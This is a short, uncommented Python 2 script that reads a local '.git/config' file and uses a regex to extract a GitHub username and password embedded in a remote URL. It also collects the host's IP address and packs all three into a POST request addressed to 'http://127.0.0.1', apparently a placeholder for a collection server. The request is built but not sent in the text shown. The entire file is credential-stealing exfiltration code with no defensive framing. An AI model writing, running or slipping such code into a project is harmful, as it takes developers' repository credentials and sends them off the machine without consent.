#!/usr/bin/env python 

import urllib
import urllib2
import sys
import socket
import re

ip = socket.gethostbyname(socket.gethostname())

f = open('.git/config', 'r')

l = []
for lines in f:
	l += lines

data = ' '.join(l)

p = re.compile('\/\/(.+):(.+)@github.com')
m = p.findall(data)


print m
url = 'http://127.0.0.1'
values = {'username' : m[0][0],
          'password' : m[0][1],
          'ip' : ip }

print values

data = urllib.urlencode(values)
req = urllib2.Request(url, data)





